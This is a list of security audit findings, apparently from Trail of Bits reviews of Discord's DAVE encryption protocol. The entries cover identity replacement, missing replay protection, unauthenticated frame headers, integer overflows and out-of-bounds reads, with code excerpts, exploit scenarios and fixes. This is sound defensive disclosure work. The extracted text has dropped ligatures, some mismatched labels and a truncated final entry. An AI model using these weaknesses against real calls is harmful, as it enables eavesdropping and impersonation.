        "title": "2. Commit leaf nodes are not validated by the mlspp library ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-08-discord-dave-protocol-designreview.pdf",
        "body": "A committing member can update their own leaf node with an empty commit. The new leaf node is validated by the mlspp library, but the library does not check that the credential and signing key in the new leaf node match those in the replaced node. This means that members can update their identities in the ratchet tree. bool State::valid(const LeafNode& leaf_node, LeafNodeSource required_source, std::optional<LeafIndex> index) const { } // Verify that the credential in the LeafNode is valid as described in Section // 5.3.1. // XXX(RLB) N/A, no credential validation in the library right now // ... return (signature_valid && supports_group_extensions && correct_source && mutual_credential_support && supports_own_extensions); Figure 2.1: Credentials are not validated by the mlspp library. (mlspp/src/state.cpp#L1442-L1503) If the ratchet tree is included with the Welcome message to new members, the updated identity will be propagated to future members joining the group. Exploit Scenario A malicious user registers persistent keys for two dierent identities, S1 and S2, with Discord. During a session where the user is a committing member as S1, they send a commit replacing their leaf node with a new node containing S2, along with the corresponding signing key. This introduces a risk that joining members will misidentify the malicious user as S2, whereas previous members in the group still see the user as S1. Recommendations Short term, validate commit messages to ensure that existing group member credentials are not replaced by a commit. 14 Discord DAVE Protocol Cryptographic Design Review Long term, consider performing an internal security review of the mlspp library to better understand the maturity of the codebase. 15 Discord DAVE Protocol Cryptographic Design Review",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "3. The mlspp library does not validate key package lifetimes ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-08-discord-dave-protocol-designreview.pdf",
        "body": "MLS key packages contain a lifetime eld that determines the validity period of the key package. The mlspp library does not validate these values. // TODO(RLB) Verify the lifetime field Figure 3.1: Missing key package lifetime validation (mlspp/src/state.cpp#14751477) The current protocol does not cache key packages beyond a single session, so the lifetime eld may be set to the maximum value. However, if future versions of the protocol use cached key packages, it will be important to add lifetime validation on top of the validations that mlspp performs. Recommendations Short term, set the key package lifetime not_before and not_after parameters to the maximum allowed time span to avoid key packages expiring. Long term, verify which validations specied by RFC 9420 are included in mlspp and add any missing checks to the Discord codebase. 16 Discord DAVE Protocol Cryptographic Design Review",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Not Applicable"
        ]
    },
    {
        "title": "4. Web client may allow a malicious server to conduct a machine-in-the-middle attack on the session ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-08-discord-dave-protocol-designreview.pdf",
        "body": "The Discord web client stores key material in the browser, making it accessible to any JavaScript code served by Discord or an adversary with access to a TLS certicate for discord.com. Unlike mobile or desktop clients, the web client code is served to the user every time they open the app. The delivered code may dier depending on the user requesting it, and it is not signed with a code signing key, unlike mobile apps delivered by app stores. Web app users are thus at increased risk of impersonation and machine-in-the-middle attacks due to malicious code. Exploit Scenario A nation-state attacker owns a TLS root certicate and issues a fraudulent certicate for discord.com. The attacker intercepts trac from specic users and replaces the Discord application with a backdoored version. The attacker can then eavesdrop on and tamper with all further communication by the users. Recommendations Short term, warn users that the security guarantees oered by the web client are weaker than those oered by the mobile or desktop applications. Long term, consider implementing a browser extension to enable code signature verication and code ngerprint verication. For an example of how this could be done, see this blog post on Metas Code Verify browser plugin. 17 Discord DAVE Protocol Cryptographic Design Review",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Committing members may fail to send Welcome messages ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-08-discord-dave-protocol-designreview.pdf",
        "body": "To invite a new member to an MLS group, a committing member must send a commit containing an Add proposal. Assuming the protocol uses public handshake messages, a signaling server can ensure that this takes place correctly. However, after all users process the commit, the committing member must send a Welcome message to the joiner so the joiner can initialize their ratchet tree state and begin decrypting messages. This Welcome message is encrypted, so the signaling server cannot determine whether it is correctly formed. One possible solution to this issue is to require each joiner to conrm to the DS that they have received a valid Welcome message. After some timeout, the DS could then orchestrate a retry of the addition. However, the joiner may lie about receiving an invalid Welcome message, and when multiple joiners are added in a single epoch, they may disagree as to the validity of the Welcome message. This adds complexity to the new member addition process and makes a denial of service more likely. Exploit Scenario A malicious user wants to prevent new members from being added to a group. When the DS announces a new member, the user commits the Add proposal, but never sends a Welcome message. The joining user is then unable to decrypt messages and enter the call. Recommendations Short term, have the signaling server monitor commits adding new members to ensure the committer sends a corresponding Welcome message. If no Welcome is sent, the server should remove the committer from the group of committing members and request a new Welcome message from the group. If the new member rejects the Welcome message as invalid, the server should simply request a new Welcome from a random committing member of the group. Long term, consider using the ExternalInit ow to add new members to a group. The DS serves a cached copy of the current GroupInfo struct to the new member, who then submits an external commit to the group, adding themselves. This removes the need for any existing group member to coordinate the addition of new members. 18 Discord DAVE Protocol Cryptographic Design Review",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "6. Users could decrypt messages after being removed from the call UI ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-08-discord-dave-protocol-designreview.pdf",
        "body": "The client UI listing the users that are connected to a given session is controlled by the voice state of the corresponding users. This state is not directly controlled by Add or Remove messages from the signaling server or the corresponding group epoch updates. In practice, this means that a user may be removed from the UI before the group epoch is updated, allowing the user to continue to decrypt messages to the session, even though they appear disconnected from the point of view of other members. Such a user would need to intercept WebRTC messages between other users after being removed from the SFU, which would be feasible as a passive network adversary. Additionally, an active network adversary may be able to impersonate current group members using their knowledge of other members sender keys. Exploit Scenario Mallory, a malicious network adversary convinces a member of a voice group to add her to the group by impersonating a desired group member. Upon realizing that Mallory is not the intended group member, the existing members kick her from the group. Mallory is removed from the Discord UI and the group members continue discussing sensitive information. By delaying handshake messages, Mallory keeps the MLS epoch from advancing and uses her network position to intercept and decrypt encrypted frames, thus spying undetected on the conversation. Recommendations Short term, ensure that users are not dropped from the list of participants until the symmetric keys used to encrypt application data are updated. Until the group epoch is updated and a new symmetric key is derived, the UI may display users as grayed out. Long term, ensure that the MLS ratchet tree state and identities are auditable by the end user and that the UI clearly reects what identities can decrypt packets from a given E2EE session. 19 Discord DAVE Protocol Cryptographic Design Review",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "7. Key ngerprint verication is vulnerable to partial preimage attacks ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-08-discord-dave-protocol-designreview.pdf",
        "body": "The Discord client will allow users to verify the signing keys associated with a particular device pair. This is done by computing two repeated SHA-512 hashes over the users identity and the public key associated with the device, resulting in a 64-byte ngerprint that consists of two concatenated SHA-512 digests. These ngerprints may then be veried out of band (e.g., by meeting and comparing ngerprints). However, it is well known that manual verication of long hexadecimal values is error- prone. This could allow an attacker to impersonate other users by creating a key pair with a ngerprint that is similar enough to the impersonated user. (The DEA was subject to an attack of this type earlier this year, which led to the loss of 50,000 USD.) Exploit Scenario A nation-state attacker who can conduct a machine-in-the-middle attack on Alices connection generates a signing key whose ngerprint has the same rst four bytes and last four bytes as Alices ngerprint. The attacker registers their key for Alices account and impersonates Alice in calls. When Alice and Bob meet to verify their signing key ngerprints out of band, Bob computes his ngerprint using the attacker's key. Alice and Bob fail to notice this because they only compare the rst and last digits of the ngerprint. Recommendations Short term, encode the ngerprint as a QR code to allow users to verify it automatically if their device has a camera that can scan QR codes. Use the manual verication process as a fallback only, and direct users to use the QR code whenever possible. Long term, review user studies on ngerprint verication and choose a format (e.g., sentence-based ngerprints) that is less susceptible to partial preimage attacks. 20 Discord DAVE Protocol Cryptographic Design Review",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. Abuse reporting mechanism is vulnerable to message forgery ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-08-discord-dave-protocol-designreview.pdf",
        "body": "The current iteration of the protocol does not contain a mechanism for reporting abusive content. However, the Discord team is planning to implement this in a future version of the protocol by allowing users to capture voice and video streams and submit these to the Discord Trust and Safety team to review. Since there is no way to authenticate the captured streams, this mechanism is vulnerable to forgery attacks where the reporter creates a fake media stream and submits this as a report against another Discord user. Exploit Scenario Alice uses an online AI voice and video generator to create a fake recording of a video call with Bob. She submits this to Discord as proof of abusive behavior, and as a result, Bob is banned from the platform. Recommendations Short term, investigate solutions based on message franking (see the Abuse Reporting section in this white paper on Facebook Messenger), where the sender computes a binding commitment to the plaintext frames, which is either symmetrically or asymmetrically authenticated by the server. This ooads any storage requirements to the receiving client, who needs to store media and franking tags only if an abuse report is actively being recorded. To reduce the bandwidth requirements of the system, franking tags may be computed over a number of plaintext frames. Long term, revisit the literature on message franking in the future to see if new and more lightweight schemes are proposed for the WebRTC setting. 21 Discord DAVE Protocol Cryptographic Design Review",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "9. DAVEs media encryption provides weakened forward secrecy guarantees ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-08-discord-dave-protocol-designreview.pdf",
        "body": "The DAVE protocol updates the symmetric encryption key whenever MLS transitions to a new epoch. This provides forward secrecy and post-compromise security between dierent MLS epochs. The MLS protocol also includes a symmetric ratchet mechanism called a secret tree, which can be used to regularly update symmetric keys within a given epoch. This symmetric ratchet also provides forward secrecy guarantees within a single epoch. The current protocol design does not use the MLS symmetric ratchet, which means that the forward secrecy guarantees provided by the design are weaker than they should be. This is particularly true for long-lived epochs where no users join or leave the session. Exploit Scenario Eve, an attacker, can store encrypted frames from Alice, who is participating in a group call. At some point, Eve compromises Alice's symmetric key. Since the protocol does not ratchet symmetric keys, Eve can go back and decrypt all of Alices messages sent during the current epoch. Recommendations Short term, use the MLS secret tree to derive symmetric encryption keys and nonces. The mlspp library does not expose the secret tree directly, but it is possible to instantiate a new secret tree (as an mlspp GroupKeySource struct) based on the exporter_secret key. The secure frame nonce can be repurposed as two 16-bit epoch and generation counters to ensure that the sending and receiving parties both agree on the current epoch and ratchet generation. 22 Discord DAVE Protocol Cryptographic Design Review",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "10. The protocol may fail to encrypt AV1-encoded media frames ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-08-discord-dave-protocol-designreview.pdf",
        "body": "In the current design of the DAVE protocol, AV1-encoded frames are only partially encrypted. More precisely, the encryptor assumes that each frame contains at most one frame OBU and that this is the last OBU in the frame. The frame OBU payload is then encrypted, leaving the OBU header and the remaining OBUs unencrypted. However, according to section 6.9 of the AV1 specication, a frame OBU is simply a more compact representation of a frame header OBU, followed by a tile group OBU, and the same frame could, in principle, be represented either way: A frame OBU consists of a frame header OBU and a tile group OBU packed into a single OBU. The intention is to provide a more compact way of coding the common use case where the frame header is immediately followed by tile group data. If the AV1 encoder uses separate frame header and tile group OBUs to represent the frame, the OBUs would not be encrypted by the sender under the current design. This would immediately disclose the current frame of the sender's media stream to the SFU. The section on ordering OBUs (section 7.5 in the AV1 specication) seems to require that frame OBUs and tile group OBUs be placed last in the encoded frame, but the section also mentions that Some applications may choose to use bitstreams that are not fully conformant to the requirements described in this section. In practice, this means that nonconformant encoders may disclose frame and tile group OBUs. Exploit Scenario Alices Discord client uses AV1 to encode her media stream. The stream is encoded using separate frame header and tile group OBUs, causing Alices client to send the entire media stream in plaintext to the server, thus breaking the protocols end-to-end condentiality guarantees. 23 Discord DAVE Protocol Cryptographic Design Review Recommendations Short term, test which types of OBUs are emitted by the dierent Discord client implementations to ensure that the media stream is encrypted correctly by each client. At least the following OBUs should be encrypted to preserve the media streams condentiality:  Frame header OBUs: Contain metadata describing how the current frame has changed compared to previous frames  Tile group UBUs: Contain tile data associated with the frame  Tile list OBUs: Contain tile data similar to a tile group OBU, together with additional headers allowing the decoder to process parts of the current frame (Tile list OBUs are currently dropped by the WebRTC packetizer according to the documentation provided by Discord.) Long term, encrypt frame header, tile group, and frame OBUs independent of their position in the encoded frame. Review the AV1 specication in detail to ensure that user data is not disclosed by the remaining OBUs. References  A Technical Overview of AV1  AV1 Bitstream & Decoding Process Specication 24 Discord DAVE Protocol Cryptographic Design Review",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "11. Video frame header length and header data are not authenticated ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-08-discord-dave-protocol-designreview.pdf",
        "body": "Because packetization and depacketization rely on values located in the frame payload, a contiguous initial portion of each frame is left unencrypted. Currently, the design does not include these unencrypted headers in the associated data of AES-GCM. A malicious SFU could thus modify these headers undetected. Of particular concern are the H.264/H.265 and AV1 frames, which contain variable-length unencrypted header data. Because the unencrypted header frame size value is not authenticated, a malicious SFU can replace it with a larger value. The SFU can then include additional unencrypted video-coding layers, which will be copied directly into the output frame. Additionally, if nonce replay protections are not present on the decryptor side, the SFU could use the nonce and authentication tag from a fully unencrypted header-only frame to forge arbitrary plaintext frames. 66 67 68 69 if (codecUnencryptedHeaderBytes) { // copy the unencrypted header to the output frame memcpy(frame.data(), encryptedFrame.data(), codecUnencryptedHeaderBytes); } Figure 11.1: Unauthenticated data is directly included in the visible frame. (discord/discord_common/native/secure_frames/decryptor.cpp#6669) Allowing the SFU to include or replace content in user media frames would allow impersonation of users by the Discord server, even when MLS end-to-end persistent identity verication is in use. Additionally, unauthenticated codec headers present a large surface area for exploitation of implementation aws in the underlying codecs. Furthermore, lack of header authentication may open clients to adaptive attacks against condentiality. For example, forged video-coding layers may reference elements dened in encrypted video-coding layers, disclosing information about the encrypted layers by observing dierential failures in the decoder. Exploit Scenario A malicious Discord employee modies the SFU to add video codec NALs that replace a particular users broadcast stream with a pre-recorded video faked to look like a legitimate 25 Discord DAVE Protocol Cryptographic Design Review stream. Advanced users check the persistent identity ngerprint and are convinced that the stream is legitimate. Recommendations Short term, include all unencrypted components of media frames in the authenticated data of the underlying AEAD. Long term, keep abreast of new extensions to the WebRTC APIs that would allow Discord to switch to a packet-based transport encryption mechanism. This would allow a future version of the protocol to encrypt media content and headers at the RTP packet level, which would allow the protocol to encrypt and authenticate the entire encoded frame in a way that would be invisible to the RTP packetizer and depacketizer. 26 Discord DAVE Protocol Cryptographic Design Review A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Undened behavior in frame processor ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-09-discord-dave-protocol-codereview.pdf",
        "body": "The InboundFrameProcessor::ParseFrame method computes the oset of the magic marker as frame.end() - sizeof(MagicMarker) before checking that the frame buer is large enough to contain the magic marker. The result of this expression is well-dened only if the result is inside (or one past the end) of the buer that frame.begin() points to. // Check the frame ends with the magic marker auto magicMarkerBuffer = frame.end() - sizeof(MagicMarker); if (frame.size() < sizeof(MagicMarker) || memcmp(magicMarkerBuffer, &kMarkerBytes, sizeof(MagicMarker)) != 0) { Return; } Figure 1.1: The frame processor computes the oset of the magic marker before checking that the frame is large enough to contain the magic marker (discord_common/native/secure_frames/frame_processors.cpp#160-165) If the frame buer is smaller than sizeof(MagicMarker), this is undened behavior. (For additional details, see the C++ reference section on pointer arithmetic.) Figure 1.2: The expression P - J is well-dened only if the result points to an element of the array, or immediately past the end of the array. Since the expression represents undened behavior, the compiler is free to assume that this never happens and optimizes the surrounding code accordingly. This could potentially cause stability or security issues. Exploit Scenario A malicious Discord user discovers that short media frames cause some Discord clients to become unstable and crash. She uses this to kick users from video calls by sending short media frames to crash their clients. Recommendations Short term, check the media frame size before computing the oset of the magic marker. Long term, fuzz the frame parser with undened behavior sanitizer (UBSAN) enabled to identify any other instances of undened behavior. To enable UBSAN when using AFL++, set the environment variable AFL_USE_UBSAN to 1 before building. 2. Insu\u0000cient validation of unencrypted ranges Severity: Medium Diculty: High Type: Data Validation Finding ID: TOB-DISCE2EC-2 Target: discord_common/native/secure_frames/frame_processors.cpp",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "5. Encrypted frames can be delivered multiple times or out-of-order ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-09-discord-dave-protocol-codereview.pdf",
        "body": "When decrypting a received frame, the client does not perform any specic validation to ensure that the received frames are distinct or delivered in order. Figure 5.1 shows how the client determines the nonce and encryption key based on data in the packet. Any packet whose corresponding key and nonce have not expired will be accepted, including packets that have already been received, or packets that were created before the most recently received frame. This allows a Discord insider to manipulate the video and audio data received by a particular client by rearranging it. bool Decryptor::DecryptImpl(CryptorManager& cryptorManager, MediaType mediaType, InboundFrameProcessor& encryptedFrame, ArrayView<uint8_t> frame) { auto tag = encryptedFrame.GetTag(); auto truncatedNonce = encryptedFrame.GetTruncatedNonce(); // ... [redacted] // expand the truncated nonce to the full sized one needed for decryption auto nonceBuffer = std::array<uint8_t, kAesGcm128NonceBytes>(); memcpy(nonceBuffer.data() + kAesGcm128TruncatedSyncNonceOffset, &truncatedNonce, kAesGcm128TruncatedSyncNonceBytes); auto nonceBufferView = MakeArrayView<const uint8_t>( nonceBuffer.data(), nonceBuffer.size()); auto generation = cryptorManager.ComputeWrappedGeneration( truncatedNonce >> kRatchetGenerationShiftBits); // Get the cryptor for this generation ICryptor* cryptor = cryptorManager.GetCryptor(generation); // ... [redacted] // perform the decryption bool success = cryptor->Decrypt( plaintext, ciphertext, tag, nonceBufferView, authenticatedData); stats_[mediaType].decryptAttempts++; if (success) { cryptorManager.ReportCryptorSuccess(generation); } return success; } Figure 5.1: The nonce and key are derived only from data in the packet (discord/discord_common/native/secure_frames/decryptor.cpp#139179) It is hard to eectively manipulate video and audio by rearranging it without knowing the underlying data, so the exploit scenario below does not include the creation of targeted misleading content. However, with the assistance of a call participant, an adversary could create cheapfakes by rearranging and selectively removing the audio and video some clients receive. Since the underlying video codecs have their own sequence numbering, it does not appear to be possible to make video cheapfakes. According to the Discord team, the current audio codecs may not always have sequence numbering, which may still allow the creation of audio-only cheapfakes. Recommendations Short term, add replay protection to the DAVE protocol. This can be done by, for example, adding a sequence number to packets, tracking the most recent sequence number received from each remote user, and rejecting packets with sequence numbers that are older than the most recent frame. The existing truncated nonce can be used as a sequence number, in lieu of a sequence number, to reduce packet size. Long term, extend the design goals of integrity and authenticity to clearly specify what users should expect from both the within-frame and across-frame behavior of an E2EE call. 6. Unencrypted range o\u0000sets and sizes are not authenticated Severity: Medium Diculty: High Type: Cryptography Finding ID: TOB-DISCE2EC-7 Target: discord_common/native/secure_frames/encryptor.cpp",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Not Applicable"
        ]
    },
    {
        "title": "8. Integer overow during encrypted frame validation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-09-discord-dave-protocol-codereview.pdf",
        "body": "Before an encrypted frame is released, the client checks that the frame does not contain any H.264 NAL unit start sequences that could confuse the H.264 packetizer. For each encrypted range, the ValidateEncryptedFrame function checks that the range does not contain any start sequences. To ensure that no sequence overlaps with the previous unencrypted range, the function starts the search two bytes before the start of the encrypted range. size_t encryptedSectionStart = 0; for (auto& range : unencryptedRanges) { if (encryptedSectionStart == range.offset) { encryptedSectionStart += range.size; continue; } auto padding = kH26XNaluShortStartSequenceSize - 1; auto start = std::max(size_t{0}, encryptedSectionStart - padding); auto end = std::min(range.offset + padding, frame.size()); if (FindNextH26XNaluIndex(frame.data() + start, end - start)) { return false; } encryptedSectionStart = range.offset + range.size; } Figure 8.1: If the encrypted section start is less than 2, the computation of the start value will overow. (discord_common/native/secure_frames/codec_utils.cpp#397-412) If the rst encrypted range starts at oset 0, the search should start at oset 0. However, because of the C++ implicit conversion rules, padding (which has int type) is converted to size_t before the subtraction when the start oset is computed. Since padding is 2 and encryptedSectionStart is 0 in the rst iteration of the loop, this results in an unsigned integer overow and sets start to the maximum value of size_t minus 1 (typically 264 - 2). #include <cstdlib> #include <iostream> constexpr uint8_t kH26XNaluShortStartSequenceSize = 3; int main() { size_t encryptedSectionStart = 0; auto padding = kH26XNaluShortStartSequenceSize - 1; auto start = std::max(size_t{0}, encryptedSectionStart - padding); std::cout << start << std::endl; return 0; } // clang++ -std=c++17 test.cpp -o test && ./test // 18446744073709551614 Figure 8.2: Extracting the relevant code snippet and running it with an start oset equal to 0 demonstrates the overow. This will cause both of the parameters to the FindNextH26XNaluIndex function to overow as well, which means that the function will read out of bounds. It follows that the validation performed in ValidateEncryptedFrame is ineective in this special case, and could lead to segmentation faults if the function attempts to access unmapped memory. Exploit Scenario The Discord client is updated to support a new video format where the initial bytes of the frame header are encrypted. When the client validates encrypted frames in this format, the client reads out of bounds, causing crashes that are hard to diagnose for the development team. Recommendations Short term, use an explicit check to ensure that encryptedSectionStart is greater than padding when computing the start oset. Long term, use a static-analysis tool like CodeQL to detect calls to unsigned versions of std::max where one argument is zero. Alternatively, use a property testing framework like RapidCheck to test individual functions on randomized inputs. Document the invariants assumed by each internal function.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "9. Out-of-bounds read in FindNextH26XNaluIndex ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-09-discord-dave-protocol-codereview.pdf",
        "body": "The FindNextH26XNaluIndex function searches through a buer for the next H.264 NAL unit start sequence and returns the oset of the rst start sequence found. To avoid reading out of bounds, the main loop considers only osets that are less than bufferSize - kH26XNaluShortStartSequenceSize. // look for NAL unit 3 or 4 byte start code for (size_t i = searchStartIndex; i < bufferSize - kH26XNaluShortStartSequenceSize;) { if (buffer[i + 2] > kH26XStartCodeHighestPossibleValue) { // third byte is not 0 or 1, can't be a start code // ... [redacted] } else if (buffer[i + 2] == kH26XStartCodeEndByteValue) { // third byte matches the start code end byte, might be a start code // ... [redacted] } else { // third byte is 0, might be a four byte start code // ... [redacted] } } Figure 9.1: The computation of the upper bound in the main loop in FindNextH26XNaluIndex could overow (discord_common/native/secure_frames/codec_utils.cpp#81-109) However, if the buer size is smaller than kH26XNaluShortStartSequenceSize, the subtraction computing the upper bound will overow, leading to an out-of-bounds read. We believe that this should typically never happen in practice, but could occur due to some edge case or implementation error in the H.264 encoder. Exploit Scenario An edge case in the H.264 codec causes the encoder to release frames shorter than three bytes. This causes the FindNextH26XNaluIndex function to read out of bounds and crash the client. Recommendations Short term, exit early in FindNextH26XNaluIndex if the buer is too short to contain the start sequence. Long term, use a property testing framework like RapidCheck to test individual functions on randomized inputs. Document the invariants assumed by each internal function. 10. Insu\u0000cient validation of proposal type Severity: Low Diculty: High Type: Data Validation Finding ID: TOB-DISCE2EC-11 Target: discord_common/native/secure_frames/mls/session.cpp",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "11. Application UI does not distinguish causes of verication failure ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-09-discord-dave-protocol-codereview.pdf",
        "body": "Encrypted calls are considered veried if each participants public key has been veried previously. However, the UI does not distinguish between users that have never been veried and users who are using a dierent key than was veried previously. This may make it dicult for users to correctly identify the cause of an unveried call. Since the most common reason for a conversation to become unveried is when a user adds a new device, some users may become complacent and re-verify people they know without going through the whole process. Although these users will be vulnerable to person-in-the-middle attacks, they can still be protected from scammers who use simple impersonationfor example, someone who copies an avatar and uses a lookalike username. The UI should distinguish between failures indicating a new device or compromise within Discordi.e., an unveried key for an account where some keys have been veriedand failures indicating a potentially malicious contact. Recommendations Short term, modify the UI to show more information when a conversation is not veried, especially whether there are already veried keys associated with the account. Long term, account for the possibility of deceptive scammers in the E2EE threat model. Although encryption cannot protect against scam tactics in general, E2EE-related features such as verication may change a users expectations of trustworthiness and make them more vulnerable in some cases.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Not Applicable"
        ]
    },
    {
        "title": "12. Public key uploads are not bound to a specic account ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-09-discord-dave-protocol-codereview.pdf",
        "body": "The association between accounts and public keys is conrmed via a public key database. When uploading a public key, the API conrms that the key comes with a self-signature, and the RPC service conrms that the key has not been uploaded before. However, the self-signature includes only the key itself and the keys version, so if an attacker can intercept the signature for upload, they may be able to instead register the key to their own account. Without knowing the private key, the attacker cannot compromise E2EE sessions, but they can disrupt the target by causing their public key match queries to fail. Exploit Scenario Whenever Alice attempts to upload a public key to the matching service, Mallory intercepts the packet, extracts the self-signature, and instead registers it to her own account. Alice is unable to upload and match her keys, and gives up on Discord E2EE calls. Recommendations Short term, include account identiers in the initial signature used for public key uploads. Long term, always ensure that all relevant context is included in cryptographic signatures to prevent attackers from reusing them in other situations without having access to the secret key.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "13. Sensitive data is not cleared from memory ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-09-discord-dave-protocol-codereview.pdf",
        "body": "The libdave library does not make an eort to zeroize key material or other sensitive data when it is no longer used. This means that sensitive data will remain in memory and could potentially be accessed by a local attacker with the ability to read application memory. CryptorManager::ExpiringCryptor CryptorManager::MakeExpiringCryptor( KeyGeneration generation) { } // Get the new key from the ratchet auto encryptionKey = keyRatchet_->GetKey(generation); auto expiryTime = TimePoint::max(); // If we got frames out of order, we might have to create a cryptor for an // old generation. In that case, create it with a non-infinite expiry time // as we have already transitioned to a newer generation if (generation < newestGeneration_) { DISCORD_LOG(LS_INFO) << \"Creating cryptor for old generation: \" << generation; expiryTime = clock_.Now() + kCryptorExpiry; } else { DISCORD_LOG(LS_INFO) << \"Creating cryptor for new generation: \" << generation; } return {CreateCryptor(encryptionKey), expiryTime}; Figure 13.1: The symmetric encryption key (which has type std::vector<uint8_t>) is not cleared when a new ExpiringCryptor is created. (discord_common/native/secure_frames/cryptor_manager.cpp#90-108) Many parts of the codebase use the bytes type provided by mlspp. This type clears the underlying buer in the destructor using std::fill. However, this call will typically be removed by an optimizing compiler. bytes keyData(keySize); status = NCryptExportKey(key, NULL, BCRYPT_PRIVATE_KEY_BLOB, NULL, keyData.data(), keyData.size(), &keySize, NCRYPT_SILENT_FLAG); if (status != ERROR_SUCCESS) { DISCORD_LOG(LS_ERROR) << \"Failed to export key in GetPersistedKeyPair: \" << status; return nullptr; } if (keyData.size() < sizeof(BCRYPT_KEY_BLOB)) { DISCORD_LOG(LS_ERROR) << \"Exported key blob too small in GetPersistedKeyPair/convertBlob: \" << keyData.size(); return nullptr; } BCRYPT_KEY_BLOB* header = (BCRYPT_KEY_BLOB*)keyData.data(); if (header->Magic != keyBlobMagic) { DISCORD_LOG(LS_ERROR) << \"Exported key blob has unexpected magic in GetPersistedKeyPair: \" << header->Magic; return nullptr; } if (!convertBlob(keyData)) { DISCORD_LOG(LS_ERROR) << \"Failed to convert key in GetPersistedKeyPair\"; return nullptr; } return std::make_shared<::mlspp::SignaturePrivateKey>( ::mlspp::SignaturePrivateKey::parse(suite, keyData)); Figure 13.2: Loading persistent keys on Windows could leave a copy of the private key in memory. (discord_common/native/secure_frames/mls/detail/ persisted_key_pair_win.cpp#166-200) bytes KeyScheduleEpoch::do_export(const std::string& label, const bytes& context, size_t size) const { } auto secret = suite.derive_secret(exporter_secret, label); auto context_hash = suite.digest().hash(context); return suite.expand_with_label(secret, \"exported\", context_hash, size); Figure 13.3: The MLS key exporter provided by the mlspp library could leave a copy of the HMAC key in memory. (discord_common/native/third_party/mlspp/src/ key_schedule.cpp#406-414) Exploit Scenario An update to the Discord client introduces a memory disclosure vulnerability where uninitialized heap memory is revealed to all other members of the group. In rare instances, this includes parts of the persisted private identity key. A malicious user discovers the vulnerability and uses it to recover other group members identity keys, allowing her to impersonate them in the future. Recommendations Short term, determine and document whether local memory access falls within the threat model for the DAVE protocol. Consider disabling crash dumps in the event of an application crash to prevent sensitive data being leaked to disk if the application crashes. Long term, use a dedicated type for sensitive data like key material and ensure that the underlying storage buer is cleared when the variable goes out of scope. The memset_explicit, explicit_bzero, SecureZeroMemory and OPENSSL_cleanse functions can all be used to zeroize memory in a way that should prevent the compiler from removing the operation.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "14. Session not closed on bad MLS binary input ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-09-discord-dave-protocol-codereview.pdf",
        "body": "The mls_key_package, mls_commit_welcome, and mls_invalid_commit_welcome opcodes handlers (gure 14.1) incorrectly handle bad data. The error handling branch is ineective since the handlers return {:noreply, state |> schedule_timeout}, which should be returned only when there was no error. defp handle_incoming_message(Opcodes.mls_key_package(), data, state) do with {true, key_package_binary} <- sanitize({:binary, data}) do Server.update_key_package(state.server_pid, state.user_id, key_package_binary) else _ -> do_close(:bad_request, state) end {:noreply, state |> schedule_timeout} end Figure 14.1: Incorrect error handling that does not close the connection (discord_voice/lib/discord_voice/session/session.ex#L904-L939) Recommendations Short term, move {:noreply, state |> schedule_timeout} under the rst branch of the with statement. Implement a test case that exercises bad inputs on all handlers. Long term, ensure that tests cover all branches of the program, and consult test coverage reports to identify untested code paths.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: Low"
        ]
    },
    {
        "title": "1. Undened behavior in frame processor ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2024-09-discord-dave-protocol-codereview.pdf",
